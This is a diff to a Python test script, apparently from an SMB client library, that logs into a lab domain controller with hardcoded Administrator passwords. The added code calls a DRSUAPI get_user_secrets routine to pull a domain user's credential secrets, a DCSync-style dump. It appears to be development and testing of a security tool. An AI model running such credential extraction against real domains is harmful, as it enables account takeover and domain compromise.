@@ -26,9 +26,16 @@ async def filereader_test(connection_string, filename):
 	async with SMBConnection(spneg, target) as connection: 
 		await connection.login()
 		
-		t = SMBDRSUAPI(connection)
-		await t.connect()
-		await t.open()
+		try:
+			t = SMBDRSUAPI(connection, 'TEST.corp')
+			await t.connect()
+			await t.open()
+			input('open succsess!')
+			await t.get_user_secrets('victim')
+		except Exception as e:
+			import traceback
+			traceback.print_exc()
+			print('Error! %s' % e)
 		return
 		tmpFileName = os.urandom(4).hex() + '.tmp'
 		rreg = SMBRemoteRegistryService(connection)
@@ -61,8 +68,10 @@ async def filereader_test(connection_string, filename):
 	
 if __name__ == '__main__':
 	#connection_string = 'TEST/victim/ntlm/password:Passw0rd!1@10.10.10.2'	
-	connection_string = 'TEST/Administrator/sspi-ntlm/password:aaaaaaaaaaa@win2019ad.test.corp/10.10.10.2'
+	#connection_string = 'TEST/Administrator/ntlm/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
 	#connection_string = 'TEST/Administrator/sspi-ntlm/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
+	connection_string = 'TEST/Administrator/kerberos/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
+	#connection_string = 'TEST.corp/Administrator/sspi-kerberos@win2019ad.test.corp/10.10.10.2'
 	filename = '\\\\10.10.10.2\\Users\\Administrator\\Desktop\\smb_test\\testfile1.txt'
 	
 	
